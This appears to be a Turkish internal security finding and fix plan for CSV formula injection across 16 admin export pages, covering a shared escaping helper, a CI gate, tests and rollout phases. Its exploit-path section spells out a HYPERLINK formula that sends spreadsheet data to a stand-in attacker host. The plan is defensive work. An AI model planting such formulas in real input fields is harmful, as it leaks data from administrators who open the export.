# VULN-006 — Yönetici CSV dışa aktarımında formül enjeksiyonu (PLAN, kod yok)

> **Ne bu?** REC-355 (güvenlik koşumu v3) altındaki VULN-006 bulgusunun ölçümü ve onarım planı.
> Sahip: ADMIN (URUN'dan devir; dosyalar `src/views/admin/**`) · Oluşturma: 2026-09-29 · Durum: **PLAN — onay bekliyor, kod YAZILMADI.**
> Şiddet (ALTYAPI): LOW — satış kapalıyken sömürü izi yok; **satıştan önce kapanmalı** (OPS).

**KAYNAK/CETVEL**
* `docs/standards/csv-import-export-standard.md` §1 "Metin Kaçışları": yalnız `;` / `"` kaçışını tanımlıyor; **formül nötrleme maddesi YOK** → cetvel boşluğu. Kural 1 gereği bu işin kapsamı = cetvele **§1.1 "Formül enjeksiyonu nötrleme"** yazmak.
* OWASP "CSV Injection" (=, +, -, @, sekme, satır başı ile başlayan hücre → tablolama yazılımı formül sayar; önlem: hücreyi tek tırnakla önekle).
* Kural 3 (tip güvenliği), kural 14 (tam iş: ortak yardımcı + kapı + test aynı işte).

**YÖNTEM:** şerit ADMIN, elle (15 sayfada aynı değişiklik = maestro adayı DEĞİL: her sayfada tek satır değişimi, ortak yardımcıya devir); `security-reviewer` + `diff-review`. Migration YOK.

---

## 1. Ölçüm (2026-09-29, kod)

**Bulgu:** 16 CSV dışa aktarım yüzeyinin **hiçbiri** formül karakteriyle (`= + - @ \t \r`) başlayan hücreyi nötrlemiyor; her biri kendi içinde yalnız `"` → `""` yapıyor. Ortak yardımcı YOK (`src/utils/` altında csv dosyası yok): 6 sayfa yerel `escape()` işlevi tanımlıyor, 9'u satır içi `.replace(/"/g, '""')` tekrar ediyor.

| # | Yüzey | Saldırganın kontrol edebildiği alan (örnek) |
|---|---|---|
| 1 | `OrdersTableBody` | müşteri adı, e-posta, adres notları |
| 2 | `AdminUsersTableBody` | e-posta, ad soyad (kayıt sırasında müşteri girer) |
| 3 | `ReturnsTableBody` | iade nedeni, müşteri adı |
| 4 | `AdminLogisticsTableBody` | müşteri adı, taşıyıcı |
| 5 | `MovementsTableBody` | not/neden alanları |
| 6 | `InventoryTableBody` | ad, depo yeri |
| 7 | `AdminInventoryReportPage` | ürün adı, depo |
| 8 | `CategoriesTableBody` | ad, açıklama |
| 9 | `CouponsTableBody` | kod, açıklama |
| 10 | `PricingRulesTableBody` | ad/not |
| 11 | `ProductsTableBody` | ad |
| 12 | `AuditLogTableBody` | aktör, satır kimliği |
| 13 | `ErrorsTableBody` | **`message`, `url`: istemciden gelir** (`log-client-error` Edge fonksiyonu, kimliksiz) |
| 14 | `ErrorGroupsTableBody` | aynı kaynak (hata mesajı) |
| 15 | `WebhookEventsTableBody` | olay tipi, sağlayıcı (dış sistem) |
| 16 | `InventoryCsvImport` (hata raporu indirme) | SKU ve hata mesajı içe aktarılan dosyadan gelir |

> Tablonun ikinci sütunu **örnek/çıkarımdır**; her yüzeyin gerçek kolonları göç sırasında tek tek ölçülür. Kesin olan yalnız 1. maddedeki sayım ve "hiçbirinde nötrleme yok" tespiti.

**Sömürü yolu (somut):** hesap açan bir müşteri ad alanına `=HYPERLINK("http://saldirgan/?x="&A2;"Tıkla")` yazar (ya da oturumlu bir kullanıcı olarak `log-client-error`'a mesaj gönderir; uç nokta varsayılan olarak `Authorization: Bearer` + `getUser` ister, yani en az bir müşteri hesabı gerekir) → yönetici CSV'yi Excel/Sheets'te açar → formül çalışır: veri sızdırma, yönlendirme, eski Excel'de DDE. Hedef yüksek yetkili yönetici.

**Kapsam dışı (ölçüldü):** `ProductCsvImport` yalnız OKUR; DB'ye ham yazılan değer değiştirilmez (nötrleme ÇIKIŞTA yapılır, giriş verisi bozulmaz).

## 2. Tasarım

1. **Ortak yardımcı:** `src/utils/csvHucre.ts`
   * `csvHucre(deger: string | number | boolean | null | undefined): string`: `null/undefined` → boş; **`number` olduğu gibi yazılır** (negatif sayı `-5` formül değildir, tipe göre karar); metin `= + - @ \t \r` ile başlıyorsa başına `'` konur; sonra `"` → `""` ve çift tırnakla sarılır.
   * `csvSatir(hucreler: readonly (…)[], ayrac: ',' | ';'): string`.
   * SAF fonksiyon, bağımlılık yok, birim testli.
2. **16 yüzey** yerel `escape()` / satır içi kaçışı bırakıp yardımcıyı çağırır (tek satırlık değişim; sıra: önce yardımcı + test + kapı PR'ı, sonra sayfa göçü).
3. **Kapı `INV-ADMIN-CSV-1`:** `src/views/admin/**` ve `src/components/admin/**` içinde satır içi `.replace(/"/g, '""')` YASAK (yalnız `csvHucre.ts` içinde serbest); taban SIFIR (ratchet gerekmez, tek PR'da göç). Sabotajla kanıtlanır (yerel kaçış geri eklenince kırmızı).
4. **Cetvel §1.1** (csv-import-export-standard.md): hangi karakterler, sayı istisnası, "nötrleme ÇIKIŞTA, giriş bozulmaz" ilkesi.
5. **Görünürlük bedeli (dürüst kayıt):** metin hücresinde başlangıç tırnağı Excel'de görünür hâle gelebilir (`'=A1`). OWASP'ın standart bedeli; yönetici ekranda "formül karakteriyle başlayan hücreler tırnakla önekleniyor" notu görür (CSV dışa aktarma menüsü yardım satırı, sözlükte).

## 3. Test / kabul ölçütü

| Test | Ne sınar |
|---|---|
| `csvHucre` birim | `=1+1`, `+SUM(A1)`, `-2+3`, `@x`, `\tcmd`, `\rx`, sayı `-5`, boş, `null`, çift tırnaklı metin, çok satırlı metin |
| Her yüzeyin dışa aktarımı (bileşen testi, tek parametreli tablo) | formül karakterli örnek satır → çıktıda önekli; normal satır DEĞİŞMEZ |
| `INV-ADMIN-CSV-1` | satır içi kaçış yok; sabotaj kırmızı |
| Erişilebilirlik/i18n | yardım satırı TR+EN parite |

## 4. Fazlar

| Faz | İş | Bitti sayılır |
|---|---|---|
| 0 | Plan → OPS onayı | onay |
| 1 | Yardımcı + birim test + cetvel §1.1 + kapı (kapı ilk PR'da yalnız yardımcıyı ölçer; göç PR'ıyla tam) | CI yeşil |
| 2 | 16 yüzeyin göçü (tek PR, mekanik) + yüzey testleri | kapı sıfır ihlal; tam takım yeşil |
| 3 | Kanıt | Excel'de açılmış örnek: formül hücresi metin olarak görünür (ekran görüntüsü ya da LibreOffice başsız dönüşüm çıktısı) |

## 5. Açık sorular (OPS)

1. **Tırnak öneki mi, başka önlem mi?** Önerim OWASP standardı (`'` öneki). Alternatif: tehlikeli hücreyi tamamen temizlemek (veri kaybı, önermem).
2. **Tam genişlikli karakterler** (`＝ ＋ － ＠`) da kapsansın mı? Önerim hayır (Excel formül saymaz); yalnız listelenen 6 karakter.
3. **`log-client-error` oturumlu her kullanıcıdan mesaj alıyor ve hız sınırı yok** (VULN-009 ayrı, ALTYAPI'da): CSV nötrlemesi bu yoldan gelen zararı kapatır, kaynağı kapatmaz; iki iş birbirine bağlı değil.

## 6. Riskler

* 16 yüzeyin biçimi farklı (ayraç `,` ve `;` karışık): yardımcı ayracı parametre alır, davranış değişmez.
* Sayı sanılan metin (ör. telefon `+90…`) önekle görünür değişir: telefon alanı metin olduğu için `'+90…` çıkar; Excel'de yine okunur. Kabul edilen bedel.
